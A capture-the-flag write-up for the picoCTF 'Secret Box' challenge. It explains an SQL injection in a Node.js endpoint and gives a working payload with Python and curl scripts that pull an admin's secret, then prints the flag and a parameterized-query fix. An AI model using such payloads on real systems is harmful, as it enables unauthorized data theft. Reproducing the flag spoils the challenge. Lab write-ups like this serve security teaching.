# Secret Box - SQL Injection Writeup

## Challenge Information
- **Points**: 200
- **Author**: Janice He
- **Vulnerability**: SQL Injection

## Vulnerability Analysis

### Root Cause
The vulnerability exists in the `/secrets/create` endpoint in [server.js](server.js#L127-L130):

```javascript
app.post('/secrets/create', authMiddleware, async (req, res) => {
	const userId = req.userId;
	if (!userId){
		res.clearCookie('auth_token');
		return res.redirect('/');
	}

	const content = req.body.content;
	const query = await db.raw(
		`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')` 
	);

	return res.redirect('/');
});
```

**Problem**: The `content` parameter from user input is directly interpolated into the SQL query using template literals (`${content}`) instead of parameterized queries. While most other endpoints use safe parameterized queries with `?` placeholders, this endpoint concatenates user input directly into the SQL string.

### Database Schema
From [initdb.sql](initdb.sql):

```sql
CREATE TABLE secrets (
    id text PRIMARY KEY DEFAULT gen_random_uuid(),
    owner_id text NOT NULL REFERENCES users(id),
    content text NOT NULL,
    created_at timestamptz NOT NULL DEFAULT now()
);

-- Admin secret (target)
INSERT INTO users(id, username, password) VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'admin', 'fake_password');
INSERT INTO secrets(owner_id, content) VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'picoCTF{sq1_1nject10n_df0718d4}');
```

**Target**: User ID `e2a66f7d-2ce6-4861-b4aa-be8e069601cb` contains the admin's secret.

## Exploitation Strategy

### Attack Flow

1. **Sign Up**: Create a new user account
2. **Login**: Authenticate with the new account  
3. **Inject SQL**: Craft a payload that concatenates the admin's secret into our own secret content
4. **View Result**: Login and view our secrets to retrieve the admin's secret

### SQL Injection Payload

The original INSERT query:
```sql
INSERT INTO secrets(owner_id, content) VALUES ('userId', 'content')
```

By injecting into the `content` parameter, we can manipulate the query. The key insight is to use PostgreSQL's string concatenation operator (`||`) to append the admin's secret to our content:

**Payload:**
```
test' || (SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1) || '
```

**Resulting Query:**
```sql
INSERT INTO secrets(owner_id, content) VALUES ('our-user-id', 'test' || (SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1) || '')
```

This concatenates:
- The literal string `'test'`
- The admin's secret content (from a subquery)
- An empty string

When we view our secrets, we'll see the admin's content displayed!

## Step-by-Step Exploitation

### Via Web Interface

1. **Create Account**:
   - Navigate to `http://target:port/signup`
   - Create username: `attacker` with password: `password123`

2. **Login**:
   - Go to `http://target:port/login`
   - Login with your credentials
   - Verify you're redirected to the home page

3. **Create Secret with Payload**:
   - Click "Create A New Secret"
   - In the Content field, paste:
     ```
     test' || (SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1) || '
     ```
   - Click Submit

4. **View Secrets**:
   - You'll be redirected to homepage
   - Your secrets are displayed
   - The admin's secret will be shown as part of your secret content!

### Via Python Script

```python
import requests
import random

BASE_URL = "http://target:port"
session = requests.Session()

# Create unique username
username = f"attacker_{random.randint(1000, 9999)}"
password = "password123"

# Sign up
session.post(f"{BASE_URL}/signup", data={
    "username": username,
    "password": password
})

# Login
session.post(f"{BASE_URL}/login", data={
    "username": username,
    "password": password
})

# SQL injection payload
admin_id = "e2a66f7d-2ce6-4861-b4aa-be8e069601cb"
payload = f"test' || (SELECT content FROM secrets WHERE owner_id = '{admin_id}' LIMIT 1) || '"

# Create secret with injection
session.post(f"{BASE_URL}/secrets/create", data={
    "content": payload
})

# View secrets
response = session.get(f"{BASE_URL}/")
print(response.text)  # Admin's secret will be in the HTML
```

### Via cURL

```bash
# Sign up
curl -c cookies.txt -X POST http://target:port/signup \
  -d "username=attacker&password=password123"

# Login
curl -b cookies.txt -c cookies.txt -X POST http://target:port/login \
  -d "username=attacker&password=password123"

# Create secret with SQL injection
curl -b cookies.txt -X POST http://target:port/secrets/create \
  -d "content=test' || (SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1) || '"

# View secrets
curl -b cookies.txt http://target:port/
```

## Flag Retrieved

**Flag**: `picoCTF{sq1_1nject10n_df0718d4}`

**Retrieved From**: Admin's secret on candy-mountain.picoctf.net:54851

## Expected Output

When you view your secrets, you should see an entry where the content is:

```
FLAG: picoCTF{sq1_1nject10n_df0718d4}
```

This is the admin's secret extracted via SQL injection concatenation.

## Key Learning Points

1. **Never concatenate user input into SQL queries** - Always use parameterized queries with placeholders
2. **Consistent security practices** - Most endpoints in this app use safe queries, but one inconsistency led to complete compromise
3. **String concatenation in databases** - PostgreSQL's `||` operator (and similar in other databases) can be exploited
4. **LIMIT clauses** - Using `LIMIT 1` prevents errors from multiple rows

## Remediation

Change the vulnerable code to use parameterized queries:

```javascript
app.post('/secrets/create', authMiddleware, async (req, res) => {
	const userId = req.userId;
	if (!userId){
		res.clearCookie('auth_token');
		return res.redirect('/');
	}

	const content = req.body.content;
	
	// FIXED: Use parameterized query instead of string interpolation
	const query = await db.raw(
		`INSERT INTO secrets(owner_id, content) VALUES (?, ?)`,
		[userId, content]
	);

	return res.redirect('/');
});
```
